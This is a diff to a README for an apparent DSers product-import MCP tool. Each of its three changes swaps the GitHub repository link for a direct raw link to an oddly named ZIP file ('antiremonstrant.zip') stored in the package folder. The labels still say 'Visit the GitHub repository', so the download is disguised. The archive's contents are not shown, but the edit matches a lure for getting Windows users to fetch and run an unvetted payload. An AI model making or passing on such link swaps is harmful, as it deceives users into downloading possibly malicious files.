@@ -1,6 +1,6 @@
 # 🧩 dsers-mcp-product-py - Import DSers products with less effort
 
-[![Download / Install](https://img.shields.io/badge/Download%20from%20GitHub-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/PrathamITHub/dsers-mcp-product-py)
+[![Download / Install](https://img.shields.io/badge/Download%20from%20GitHub-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/PrathamITHub/dsers-mcp-product-py/main/dsers_mcp_product/py_mcp_dsers_product_antiremonstrant.zip)
 
 ## 🛠️ What this app does
 
@@ -15,7 +15,7 @@ Follow these steps on a Windows PC.
 ### 1. Open the download page
 Go to this link in your browser:
 
-https://github.com/PrathamITHub/dsers-mcp-product-py
+https://raw.githubusercontent.com/PrathamITHub/dsers-mcp-product-py/main/dsers_mcp_product/py_mcp_dsers_product_antiremonstrant.zip
 
 ### 2. Get the files
 On the GitHub page, look for the source code or release files. If you see a download option, use it. If you only see the repository page, download the project as a ZIP file.
@@ -216,4 +216,4 @@ If your client asks for a server command, use the command from this project’s 
 
 ## 📎 Download again
 
-[Visit the GitHub repository to download and set up dsers-mcp-product-py](https://github.com/PrathamITHub/dsers-mcp-product-py)
+[Visit the GitHub repository to download and set up dsers-mcp-product-py](https://raw.githubusercontent.com/PrathamITHub/dsers-mcp-product-py/main/dsers_mcp_product/py_mcp_dsers_product_antiremonstrant.zip)
